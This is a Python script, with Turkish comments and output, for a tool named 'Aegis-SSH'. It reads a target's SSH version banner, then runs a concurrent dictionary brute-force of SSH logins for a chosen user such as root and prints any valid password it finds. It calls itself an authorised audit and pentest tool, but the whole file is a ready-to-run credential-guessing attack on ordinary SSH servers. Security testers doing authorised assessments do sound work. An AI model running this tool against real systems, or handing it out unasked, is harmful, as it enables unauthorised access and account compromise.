import asyncio
import asyncssh
import argparse
import sys
from colorama import init, Fore, Style

# Konsol Ekranı Renklendirme Yapılandırması
init(autoreset=True)

def print_banner():
    """Aracın başlangıç logosunu ekrana basar."""
    logo = f"""{Fore.CYAN}
    █████╗ ███████╗ ██████╗ ██╗███████╗       ███████╗███████╗██╗  ██╗
   ██╔══██╗██╔════╝██╔════╝ ██║██╔════╝       ██╔════╝██╔════╝██║  ██║
   ███████║█████╗  ██║  ███╗██║███████╗ █████╗███████╗███████╗███████║
   ██╔══██║██╔══╝  ██║   ██║██║╚════██║ ╚════╝╚════██║╚════██║██╔══██║
   ██║  ██║███████╗╚██████╔╝██║███████║       ███████║███████║██║  ██║
   ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═╝╚══════╝       ╚══════╝╚══════╝╚═╝  ╚═╝
    {Style.RESET_ALL}"""
    print(logo)
    print(f"{Fore.YELLOW}[+] Asenkron SSH Güvenlik Denetim Aracı v1.0.0{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[+] Eğitim ve Sızma Testi Amaçlıdır.{Style.RESET_ALL}\n")

async def grab_banner(ip, port):
    """Hedef porttan SSH versiyon bilgisini (Banner) asenkron olarak okur."""
    print(f"{Fore.CYAN}[*] {ip}:{port} üzerinden SSH Banner bilgisi analiz ediliyor...{Style.RESET_ALL}")
    try:
        reader, writer = await asyncio.wait_for(asyncio.open_connection(ip, port), timeout=3.0)
        banner_bytes = await reader.readline()
        writer.close()
        await writer.wait_closed()
        
        banner_str = banner_bytes.decode('utf-8').strip()
        print(f"  [{Fore.GREEN}+{Style.RESET_ALL}] Hedef Servis Versiyonu: {Fore.GREEN}{banner_str}{Style.RESET_ALL}")
        return banner_str
    except asyncio.TimeoutError:
        print(f"  [{Fore.RED}-{Style.RESET_ALL}] Zaman aşımı: Port kapalı veya yanıt vermiyor.")
        return None
    except ConnectionRefusedError:
        print(f"  [{Fore.RED}-{Style.RESET_ALL}] Bağlantı reddedildi: Servis aktif değil.")
        return None
    except Exception as e:
        print(f"  [{Fore.RED}-{Style.RESET_ALL}] Banner alınamadı: {e}")
        return None

async def attempt_login(ip, port, username, password, semaphore):
    """Tek bir kimlik bilgisi kombinasyonunu test eder."""
    async with semaphore:
        try:
            # Kritik olmayan uyarıları gizle
            asyncssh.set_log_level('CRITICAL')
            async with asyncssh.connect(
                ip, port=port, username=username, password=password,
                known_hosts=None, client_keys=None, login_timeout=4.0
            ) as conn:
                print(f"\n[{Fore.GREEN}KRİTİK BAŞARI{Style.RESET_ALL}] Geçerli Kimlik Bilgisi Tespit Edildi!")
                print(f" └── Kullanıcı: {Fore.GREEN}{username}{Style.RESET_ALL} | Şifre: {Fore.RED}{password}{Style.RESET_ALL}\n")
                return password
        except asyncssh.PermissionDenied:
            # Şifre yanlış
            return None
        except Exception:
            # Bağlantı kopması vs.
            return None

async def run_brute_force(ip, port, username, wordlist_path, threads):
    """Wordlist üzerinden asenkron şifre denemesi (Brute-Force) başlatır."""
    print(f"\n{Fore.CYAN}📁 Denetim başlatılıyor ({threads} eşzamanlı asenkron bağlantı)...{Style.RESET_ALL}")
    try:
        with open(wordlist_path, 'r', encoding='utf-8') as f:
            passwords = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"[{Fore.RED}SİSTEM HATASI{Style.RESET_ALL}] Wordlist dosyası bulunamadı: {wordlist_path}")
        sys.exit(1)

    print(f"[*] Toplam yüklenen payload sayısı: {len(passwords)}")

    semaphore = asyncio.Semaphore(threads)
    tasks = [attempt_login(ip, port, username, p, semaphore) for p in passwords]
    
    # Tüm asenkron görevleri eşzamanlı çalıştır ve sonuçları bekle
    results = await asyncio.gather(*tasks)
    
    valid_passwords = [r for r in results if r is not None]
    
    print(f"\n{Fore.CYAN}--- Denetim Raporu ---{Style.RESET_ALL}")
    if not valid_passwords:
        print(f"[{Fore.GREEN}GÜVENLİ{Style.RESET_ALL}] Tarama tamamlandı. Wordlist içindeki hiçbir zayıf şifre eşleşmedi.")
    else:
        print(f"[{Fore.RED}ZAFİYET{Style.RESET_ALL}] Sistem tehlikede. Lütfen zayıf şifreleri derhal değiştirin.")

async def main():
    parser = argparse.ArgumentParser(
        description="Aegis-SSH Pentest Suite - Kurumsal SSH Güvenlik Denetimi",
        epilog="Uyarı: Bu aracı yalnızca yetkiniz olan sistemlerde kullanın."
    )
    parser.add_argument("target", help="Hedef sunucunun IP adresi")
    parser.add_argument("-u", "--user", required=True, help="Test edilecek hedef SSH kullanıcı adı (Örn: root)")
    parser.add_argument("-w", "--wordlist", required=True, help="Şifrelerin bulunduğu sözlük dosyası (.txt)")
    parser.add_argument("-p", "--port", type=int, default=22, help="Hedef SSH portu (Varsayılan: 22)")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Eşzamanlı bağlantı limiti (Varsayılan: 10)")
    
    args = parser.parse_args()
    
    print_banner()
    
    banner = await grab_banner(args.target, args.port)
    if banner:
        await run_brute_force(args.target, args.port, args.user, args.wordlist, args.threads)
    else:
        print(f"[{Fore.RED}İPTAL{Style.RESET_ALL}] Hedef servis ile iletişim kurulamadığı için tarama durduruldu.")

if __name__ == "__main__":
    try:
        # Uyumluluk için asenkron döngüyü başlat (Windows/Linux)
        if sys.platform == "win32":
            asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n\n[{Fore.RED}DURDURULDU{Style.RESET_ALL}] Kullanıcı tarafından zorla kapatıldı (Konsol Ekranı kapatılıyor).")
